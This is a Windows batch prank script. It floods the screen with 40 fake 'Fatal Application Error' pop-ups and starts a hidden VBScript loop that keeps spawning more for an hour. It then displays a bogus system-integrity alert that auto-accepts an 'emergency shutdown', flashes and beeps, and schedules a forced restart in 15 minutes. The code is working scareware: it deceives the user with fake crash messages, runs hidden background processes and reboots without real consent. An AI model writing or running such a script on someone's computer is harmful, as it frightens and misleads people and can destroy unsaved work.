@Echo Off

:: =========================================================================
:: 1. INSTANTLY BLAST 40 OVERLAPPING POP-UPS IN THE BACKGROUND
:: =========================================================================
Set "BOX_FILE=%TEMP%\popup_window.vbs"

:: Create a clean standalone error box template
@Echo MsgBox "Memory Exception: Instruction at 0x77f88a1b referenced memory at 0x00000014. The memory could not be read.", 16+0, "Fatal Application Error" > "%BOX_FILE%"

:: Use a native Batch loop to open 40 windows at the exact same time
For /L %%I In (1,1,40) Do (
    Start "" wscript.exe "%BOX_FILE%"
)

:: Build the 1-hour trickle background controller engine
Set "ENGINE_FILE=%TEMP%\stealth_engine.vbs"
@Echo Dim shl, i, startTime, totalDuration, popupCount > "%ENGINE_FILE%"
@Echo Set shl = CreateObject("WScript.Shell") >> "%ENGINE_FILE%"
@Echo startTime = Now >> "%ENGINE_FILE%"
@Echo totalDuration = 60 >> "%ENGINE_FILE%"
@Echo Do While DateDiff("n", startTime, Now) ^< totalDuration >> "%ENGINE_FILE%"
@Echo     WScript.Sleep 180000 >> "%ENGINE_FILE%"
@Echo     If DateDiff("n", startTime, Now) ^>= totalDuration Then Exit Do >> "%ENGINE_FILE%"
@Echo     Randomize >> "%ENGINE_FILE%"
@Echo     popupCount = Int((4 - 3 + 1) * Rnd + 3) >> "%ENGINE_FILE%"
@Echo     For i = 1 To popupCount >> "%ENGINE_FILE%"
@Echo         shl.Run "wscript.exe """ ^& "%BOX_FILE%" ^& """", 0, True >> "%ENGINE_FILE%"
@Echo     Next >> "%ENGINE_FILE%"
@Echo Loop >> "%ENGINE_FILE%"
@Echo Set shl = Nothing >> "%ENGINE_FILE%"

:: Launch the 1-hour continuous loop silently in the background memory
Start "" wscript.exe "%ENGINE_FILE%"

:: =========================================================================
:: 2. RUN THE FOREGROUND VISUAL INTERFACE WITH TIMEOUT CHOICE
:: =========================================================================
:enforce_loop
Mode Max
Wmic process where name="cmd.exe" call setpriority 64 > Nul 2>&1
Color 0A
Cls

@Echo [INFO] Initializing memory parity verification sweep...
:: AUDIO PHASE 1: Double alert chime during the initial text sweep
Powershell -Command "[console]::beep(800,250); [console]::beep(800,250)"
Timeout /NoBreak /T 2 > Nul
Cls

:: Fast rolling text matrix stream simulation
For /L %%X In (1,1,30) Do (
    @Echo %random% %random% %random% %random% %random% %random% 0x8007000E 0x0000003B
    Timeout /NoBreak /T 0 > Nul
)
Cls

:choice
@Echo ==========================================================
@Echo           SYSTEM INTEGRITY DESTABILIZATION ALERT
@Echo ==========================================================
@Echo.
@Echo Windows has restricted administrative core structures to protect data.
@Echo.
@Echo Allow emergency system shutdown to clear memory leaks?
@Echo [Auto-accepting "Y" in 4 seconds...]
@Echo.

:: Timeout configuration using native choice command
Choice /C YN /D Y /T 4 /M "Select (Y/N): "

If ErrorLevel 2 Goto refuse_warning
If ErrorLevel 1 Goto crash_cascade
Goto choice

:refuse_warning
Cls
:: AUDIO PHASE 2: Lower, sustained warning chime if "N" is selected
Powershell -Command "[console]::beep(440,600)"
@Echo MsgBox "Override Denied. Memory cascade threshold breached. Local hardware interface control has been dropped.", 48+0, "Kernel Core Warning" > "%temp%\prk.vbs"
Wscript "%temp%\prk.vbs"
Del "%temp%\prk.vbs"
Goto crash_cascade

:crash_cascade
Cls
Title SYSTEM CRITICAL BLOCK FAILURES OCCURRING

:: AUDIO PHASE 3: High-frequency rapid pulse sequence synchronized with the flashing UI
For /L %%X In (1,1,5) Do (
    Color 4F
    @Echo ==========================================================
    @Echo  FATAL EXCEPTION CRASH DUMP RUNAWAY // HALTING KERNEL ENGINE
    @Echo ==========================================================
    Powershell -Command "[console]::beep(1200,150)"
    Color 0C
    @Echo ==========================================================
    @Echo  FATAL EXCEPTION CRASH DUMP RUNAWAY // HALTING KERNEL ENGINE
    ==========================================================
    Powershell -Command "[console]::beep(1000,150)"
)

:: Trigger system refresh restart with a 15-minute (900 seconds) delay
Shutdown -r -t 900 -c "Gotcha! This was a prank! Your PC is just restarting cleanly to refresh components in 15 minutes."
Exit
